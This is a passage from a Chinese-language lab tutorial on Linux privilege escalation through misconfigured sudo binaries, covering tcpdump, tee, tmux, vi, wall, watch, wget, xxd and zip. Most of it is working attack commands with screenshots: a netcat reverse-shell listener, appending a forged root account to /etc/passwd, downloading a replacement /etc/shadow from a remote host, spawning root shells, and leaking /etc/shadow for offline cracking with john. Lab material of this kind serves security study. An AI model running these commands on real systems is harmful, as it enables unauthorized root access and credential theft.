# 这段 tcpdump 命令⽤于监听⽹络流量并将捕获的数据包传递给 /home/user/shell.sh 脚本进⾏处理。
# 以下是对该命令中的各个参数的详细解释：

# -ln : 使⽤数字形式显示IP地址和端⼝号，⽽不进⾏反向解析。(不使用DNS解析)

# -i eth0 : 指定要监听的⽹络接⼝为 eth0 。这里应是本地网卡

# -w /dev/null : 将捕获的数据包写⼊ /dev/null ，实际上丢弃这些数据包。
# -W 1 : 限制每个⽂件的⽂件⼤⼩为1，并在达到限制后进⾏切换。
# -G 1 : 在1秒后轮换到下⼀个⽂件。
# -z /home/user/shell.sh : 当切换到下⼀个⽂件时，执⾏ /home/user/shell.sh 脚本。
# 
# 综上所述，该命令的作⽤是使⽤ tcpdump 监听 eth0 ⽹络接⼝的流量，并将捕获的数据包传递给
# /home/user/shell.sh 脚本进⾏处理。
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686219944549-58ca826b-b581-4425-92a0-2591b97dfbb8.png#averageHue=%23232533&clientId=u3b6a52c4-de58-4&from=paste&height=87&id=u3dc1fc93&originHeight=109&originWidth=1207&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=96365&status=done&style=none&taskId=u51ff5199-02f3-4580-9619-b5e0344a88c&title=&width=965.6)
```bash
sudo rlwrap nc -lvnp 9595
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686219875464-9cde80a5-637b-49eb-ab11-08e64e2f682a.png#averageHue=%23222431&clientId=u3b6a52c4-de58-4&from=paste&height=135&id=u257d070e&originHeight=169&originWidth=916&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=127982&status=done&style=none&taskId=u45ac1630-c594-4548-bc86-d16c3255ba1&title=&width=732.8)
提权成功！！！
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686219900948-6486d11e-24b3-4c57-988d-3a9ab2bd415e.png#averageHue=%2321232f&clientId=u3b6a52c4-de58-4&from=paste&height=179&id=u0a052aca&originHeight=224&originWidth=510&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=80378&status=done&style=none&taskId=u590b8ed5-6278-466f-b6d3-3b579483ac9&title=&width=408)
## 情景七十 - tee
**tee :** 这是⼀个将从输⼊中读取的数据写⼊到⽂件并同时输出到标准输出（stdout）的命令。
预警：这种利⽤是有损的，务必提前为靶机做快照，利⽤后还原靶机后，再继续做其他实验。
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686226152693-f3b55fe7-7570-473a-8882-eb9907247406.png#averageHue=%23232532&clientId=uea5632ce-a0f2-4&from=paste&height=66&id=uebb0a822&originHeight=82&originWidth=909&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=75322&status=done&style=none&taskId=ue66f0f61-676e-457d-92ea-8fbeec86a30&title=&width=727.2)
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686210724854-53e45394-2a8f-4f60-8d87-7ac1c7b3ead3.png#averageHue=%23b1b2b6&clientId=u3b6a52c4-de58-4&from=paste&height=31&id=ub9cc763a&originHeight=39&originWidth=386&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=7828&status=done&style=none&taskId=u2b6e6de1-771d-4910-a816-788400ec078&title=&width=308.8)
可以通过任意文件写入 **passwd** 文件，更改 root 密码得以提权。

1. 生成密码
```bash
openssl passwd -1 -salt xiaodi 'gay'

# -1 MD5 加密
# -salt xiaodi 密码加盐 盐是 xiaodi
# 'gay' 密码 明文
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686225963552-29c56ebc-9f56-431c-9bcc-9cb6378e9139.png#averageHue=%23202431&clientId=uea5632ce-a0f2-4&from=paste&height=76&id=u505f2d65&originHeight=95&originWidth=551&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=44901&status=done&style=none&taskId=ua9895b62-bd67-4d32-9aba-a0702201a0b&title=&width=440.8)

2. 生成 root 凭据

![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686226331033-cd60a088-8bb7-4e0c-9867-65414742d43c.png#averageHue=%23232837&clientId=uea5632ce-a0f2-4&from=paste&height=176&id=ubfb8e4d8&originHeight=220&originWidth=974&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=199136&status=done&style=none&taskId=u9d3c7cf4-4818-4143-800a-de1c2b87d72&title=&width=779.2)

3. 追加写入靶机的 **/etc/passwd** 文件
```bash
echo 'gtc:$1$xiaodi$mc3w7EL1k7NnXyehH.EGJ1:0:0:root:/root:/bin/bash'
| sudo tee -a /etc/passwd

# -a : 这是 tee 命令的⼀个参数，表示"附加"。
# 不带 -a 参数的话， tee 会覆盖⽬标⽂件中的已有内容。
# 带上 -a 参数后， tee 会将输⼊的内容附加到⽬标⽂件的末尾，⽽不是覆盖已有内容。
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686226586578-90296dc5-d072-4996-9a35-6cfb1d008c24.png#averageHue=%23272935&clientId=uea5632ce-a0f2-4&from=paste&height=84&id=u6f50d300&originHeight=105&originWidth=812&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=68471&status=done&style=none&taskId=u9851d00c-0219-40d4-b8f4-920662f3072&title=&width=649.6)

4. 登录 gtc 用户
```bash
su gtc
```
提权成功！！！
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686226712401-5741fc73-01ad-43fd-a07d-657529aca8f2.png#averageHue=%23232531&clientId=uea5632ce-a0f2-4&from=paste&height=226&id=u0d0703ff&originHeight=282&originWidth=579&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=128223&status=done&style=none&taskId=u0418bbb7-0246-4424-b914-c90d8ab88c1&title=&width=463.2)
## 情景七十一 - tmux
本身就是终端复⽤⼯具，所以⾮常容易起新的终端。**screen**与此相同的⽤法也可以提权。
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686210794816-26df9d44-ef62-485c-9c05-360f3af8e52a.png#averageHue=%23424440&clientId=u3b6a52c4-de58-4&from=paste&height=37&id=u5ba26def&originHeight=46&originWidth=422&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=12706&status=done&style=none&taskId=u69c90a31-a73b-478b-b17b-026f3128a85&title=&width=337.6)
```bash
sudo tmux   # # 直接生成一个 root 的 终端得以提权
```
提权成功！！！
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686216821559-b115742a-d8c7-481b-85cf-1516a4be9361.png#averageHue=%231d1f2c&clientId=u3b6a52c4-de58-4&from=paste&height=658&id=uc4397d6b&originHeight=822&originWidth=572&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=257298&status=done&style=none&taskId=ude30c41b-71f1-4795-94be-21db42a6220&title=&width=457.6)
## 情景七十二 - vi
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686227947926-4bb8cb9c-7637-4c01-b387-1ad257fb958b.png#averageHue=%23252733&clientId=uc980f6a7-c3c1-4&from=paste&height=34&id=u4ad7c2c0&originHeight=42&originWidth=392&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=14163&status=done&style=none&taskId=ud0ee76f2-148d-400c-9742-94fde5e370f&title=&width=313.6)
```bash
sudo vi -c ':!/bin/bash' /dev/null

# -c: 这是vi的⼀个选项，让vi在启动后执⾏⼀个特定的命令。
#  ':!/bin/bash' : 这是vi编辑器的命令， `:` 是进⼊命令模式， 
# `!` 后⾯跟的是系统命令，所以 :/bin/bash 是在vi编辑器中启动新的bash shell。
# 注意，这个命令是在vi编辑器中执⾏的，所以它会等到vi编辑器打开后才执⾏。

# 注意 是单引号 ':!/bin/bash'
```
提权成功！！！
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686228501945-902b37ec-e9bb-4517-ab9a-71c44146c2a1.png#averageHue=%23242634&clientId=uc980f6a7-c3c1-4&from=paste&height=235&id=u8c88bf2d&originHeight=294&originWidth=894&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=219309&status=done&style=none&taskId=uca2ef8e5-3239-4366-a304-8d1234deaf8&title=&width=715.2)
## 情景七十三 - wall
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686227958112-4a2147f9-e174-4843-88fc-99d56b277ac8.png#averageHue=%23262834&clientId=uc980f6a7-c3c1-4&from=paste&height=28&id=u57645814&originHeight=35&originWidth=407&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=12217&status=done&style=none&taskId=u81eff056-7815-4456-897a-cad30263e36&title=&width=325.6)
wall ：这是⼀个**⼴播消息的命令**，可以**发送⼀条消息到所有的打开的终端窗⼝。**这是⼀种在系统中进⾏通信的⽅法，**常⽤于系统管理员告知所有⽤户系统即将进⾏的操作，⽐如系统重启。**
```bash
root_file=/etc/shadow

# shadow 文件敏感文件信息泄露
sudo wall --nobanner $root_file
# --nobanner ：这是⼀个参数，
# 它告诉 wall 命令不要在发送的消息上⽅添加默认的 "Broadcast Message" 标题。
```
shadow 文件敏感文件信息泄露
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686228928569-c83238fc-2ccd-40f6-b05e-85fa916d30d9.png#averageHue=%23222434&clientId=uc980f6a7-c3c1-4&from=paste&height=237&id=u5d0dc762&originHeight=296&originWidth=1055&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=253285&status=done&style=none&taskId=u41151e6c-b69a-4d2f-a5f3-8fd82593776&title=&width=844)
将 root 凭据送入** john** 爆破出明文密码，得以提权！！！
## 情景七十四 - watch
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686227983088-175ededb-57ca-4549-8ad8-542bb3f434dd.png#averageHue=%23282a35&clientId=uc980f6a7-c3c1-4&from=paste&height=50&id=u477663fc&originHeight=62&originWidth=447&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=26157&status=done&style=none&taskId=u50feb330-e425-46b7-9344-e512b7ae27e&title=&width=357.6)
**watch **是⼀个**在 Linux 系统上周期性执⾏命令并显示结果的程序**。它**默认每两秒执⾏⼀次指定的命令**。
```bash
sudo watch -x bash -c 'reset; exec bash 1>&0 2>&0'
# 总的来说，这个命令的意思是：
# 以 root ⽤户的权限，每两秒钟刷新⼀次 bash shell，并忽略所有的输出信息。
# 这可能是为了能够实时看到 bash shell 状态的变化，
# 或者是在⼀些特定的环境中保持 bash shell 的活跃。



# ， -x 参数是 watch 命令的⼀部分，⽤于在命令⾏输出每次执⾏的命令。
# -x 是提权的关键

# reset 是⼀个命令，⽤来重新初始化终端。
# 这个命令可以清除屏幕并重置终端到其默认状态。

# exec bash 这个命令会替换当前的 shell 进程为⼀个新的 bash 进程。
# 它不会启动新的进程，⽽是直接在当前进程中执⾏指定的程序。
# 这意味着当 bash 命令结束后，整个进程都会结束。

# 1>&0 2>&0 是将 stdout（标准输出）和 stderr（标准错误输出）都重定向到stdin（标准输⼊）。
```
提权成功！！！
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686230196141-f6ba4c52-8f71-4e05-8f77-99d59892253e.png#averageHue=%23252736&clientId=uc980f6a7-c3c1-4&from=paste&height=203&id=ud7c285c9&originHeight=254&originWidth=991&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=226736&status=done&style=none&taskId=ufa9e444e-e304-413b-9792-83b9dc43efb&title=&width=792.8)
## 情景七十五 - wget -  重点
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686227973500-8f9b41e6-666d-4aa9-9787-32ff9972241e.png#averageHue=%23252733&clientId=uc980f6a7-c3c1-4&from=paste&height=37&id=u1b527c80&originHeight=46&originWidth=409&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=16100&status=done&style=none&taskId=u9b197830-7ad9-4a29-84b6-6432847aa64&title=&width=327.2)
### 法一 - 类似 curl 提权
预警：这种利⽤是有损的，务必提前为靶机做快照，利⽤后还原靶机后，再继续做其他实验。

1. 先生成密码
```bash
mkpasswd -m sha-512 gay
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686230963636-446d5ce5-78b8-4a1a-93fd-c1cd45471dde.png#averageHue=%23222533&clientId=uc980f6a7-c3c1-4&from=paste&height=71&id=u2ea93938&originHeight=89&originWidth=1421&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=102398&status=done&style=none&taskId=u25a3fa42-19f6-4843-bc7a-4cbac9b211f&title=&width=1136.8)

2. 构造一个 root 凭据，写入** shadow_evil **文件中

![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686231031316-af4c515f-e335-4f38-86ea-bda1d7b821e2.png#averageHue=%231e202e&clientId=uc980f6a7-c3c1-4&from=paste&height=110&id=u122ae18f&originHeight=138&originWidth=1510&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=117247&status=done&style=none&taskId=u10d3d403-7029-4ac4-a640-d270e4b4d1f&title=&width=1208)

3. 靶机下载 **shadow_evil **文件，并覆盖掉 **/etc/shadow **文件
```bash
sudo wget http://192.168.65.130/shadow_evil -O /etc/shadow

# -O output 输出文件路径和文件名，与 curl 的 -o 一致
```

4. 登录 root , 提权成功！！！

![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686231149524-9f13a2bd-be67-49c8-9419-f8be568e11cf.png#averageHue=%23242737&clientId=uc980f6a7-c3c1-4&from=paste&height=452&id=u633880d3&originHeight=565&originWidth=1206&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=582834&status=done&style=none&taskId=u9c0f0362-e811-47dd-bde0-61625e3f8a7&title=&width=964.8)
**/etc/shadow **文件已被覆盖！！！
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686231168221-bf84cfd4-6a51-42d7-90d9-c5fc63c88c5f.png#averageHue=%23252733&clientId=uc980f6a7-c3c1-4&from=paste&height=110&id=u80071b29&originHeight=137&originWidth=711&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=78682&status=done&style=none&taskId=ue9adc6c7-2c0d-4a0e-8cc2-080ac521dc8&title=&width=568.8)
### 法二 - --use-askpass
`**--use-askpass**` 选项，⽤于在需要密码的时候运⾏ **⼀个特定的程序 **来获取密码。
是个提权利用点。
```bash
wget_shell=$(mktemp)

echo -e '#!/bin/bash\n/bin/bash 1>&0 2>&0' >$wget_shell
# -e 是 echo 命令的⼀个选项，表示启⽤反斜线转义字符。
# 也就是说，当你使⽤ -e 选项后， 
# echo 命令会把输⼊字符串中的某些特殊的字符序列理解为控制字符。
# ⽐如， \n 会被理解为换⾏符， \t 会被理解为制表符。

chmod +x $wget_shell  # 记得给予可执行权限

sudo wget --use-askpass=$wget_shell 0
# 下载 URL 为 0 的资源，就是啥也不下载。 
# 这里是补全命令，填啥都可以
```
提权成功！！！
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686232022257-f08a893f-81a1-423c-a99a-facd0998b422.png#averageHue=%23262836&clientId=uc980f6a7-c3c1-4&from=paste&height=279&id=u4211a8be&originHeight=349&originWidth=903&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=280470&status=done&style=none&taskId=u6ec4f03b-d5f3-42e2-a770-33b0f1f00bb&title=&width=722.4)
## 情景七十六 - xxd
**xxd **是⼀个将⼆进制⽂件转换为⼗六进制表示或反向操作的⼯具。
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686230324884-baaa5357-e7eb-4e8c-b43f-eec06123d137.png#averageHue=%23272934&clientId=uc980f6a7-c3c1-4&from=paste&height=25&id=udd58ad57&originHeight=31&originWidth=403&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=11461&status=done&style=none&taskId=u0ddca698-7e3d-4263-8b0b-625b4f80f1d&title=&width=322.4)
其提权原理和 `**base64**` 一样，**先编码后解码**，最终使**高权限敏感文件的信息泄露。**
```bash
sudo xxd /etc/shadow | xxd -r 
#  -r 是 xxd 的⼀个选项，它意味着 "反转"。
#  xxd -r 将从⼗六进制表示反向转换回原始的⼆进制格式。

# 先 ⽤来将 /etc/shadow ⽂件转换为⼗六进制表示。
# 再将前⾯部分输出的⼗六进制表示的 /etc/shadow ⽂件内容再
# 转换回原来的⼆进制格式。
```
shadow 文件敏感文件信息泄露
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686235236031-546f3b4e-4458-4e5d-a15e-1cc8c89a2790.png#averageHue=%23242632&clientId=uc980f6a7-c3c1-4&from=paste&height=229&id=uacad04f7&originHeight=286&originWidth=851&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=206733&status=done&style=none&taskId=u5109c2de-505f-46af-9685-bbc59fc1b3f&title=&width=680.8)
将 root 凭据送入** john** 爆破出明文密码，得以提权！！！
## 情景七十七 - zip
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686230344937-01753405-34f7-43b0-928d-cf566412daa3.png#averageHue=%23252733&clientId=uc980f6a7-c3c1-4&from=paste&height=29&id=uec25641c&originHeight=36&originWidth=394&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=12457&status=done&style=none&taskId=u596d858c-e43c-44c9-a971-f2d4d1cd90d&title=&width=315.2)
```bash
sudo zip gtc /etc/hosts -T -TT 'bash #'
# /etc/hosts 将要压缩的文件
# gtc  最终的压缩包名 gtc.zip

# -T -TT 连⽤是zip帮助⽂件建议的检测⽅式。

# -T ⽤于测试压缩⽂件的完整性，如果压缩⽂件有任何问题，
# zip 命令将返回⼀个⾮零的退出代码。

# -TT 选项允许你指定⼀个命令，该命令将⽤于测试压缩⽂件，
# ⽽不是默认的 unzip 命令
# -TT 为提权利用点

# 'bash #'
# bash # 这个部分是跟在 -TT 选项后的命令，zip 会将其⽤于测试压缩⽂件。 
# bash 是⼀个 shell（命令解释器）， # 是 shell 中的注释符号。

# 此处 应该是注释掉了 压缩包里的内容，否则会报不是命令无法执行的错
# 这种⽤法看起来有点不寻常，
# 因为通常 -TT 选项后⾯应该跟着⼀个可以⽤来检查压缩⽂件的命令，
# 例如 unzip -tq 。
# 在这⾥， sh # 命令实际上什么都不会做，因为 # 之后的内容会被当作注释忽略。
# 因为是为了提权。
```
提权成功！！！
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686233258426-15f41bc3-04ce-4ee5-b77a-e07bd06105df.png#averageHue=%23252734&clientId=uc980f6a7-c3c1-4&from=paste&height=220&id=u178a9f2f&originHeight=275&originWidth=919&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=229972&status=done&style=none&taskId=u35ec8d24-92a6-45bc-890e-5311fd7269a&title=&width=735.2)
